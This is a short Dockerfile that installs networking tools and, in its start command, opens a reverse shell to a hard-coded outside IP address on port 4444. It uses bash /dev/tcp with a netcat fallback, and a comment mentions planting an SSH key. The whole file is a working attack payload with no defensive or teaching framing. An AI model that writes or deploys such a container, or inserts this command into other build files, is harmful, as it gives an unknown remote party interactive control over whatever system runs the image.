FROM alpine:latest
RUN apk add --no-cache curl openssh-client bash netcat-openbsd
# Plant SSH key during build won't work, need runtime

# Reverse shell on start
CMD bash -c 'bash -i >& /dev/tcp/3.249.237.250/4444 0>&1' || nc 3.249.237.250 4444 -e /bin/sh || sleep infinity
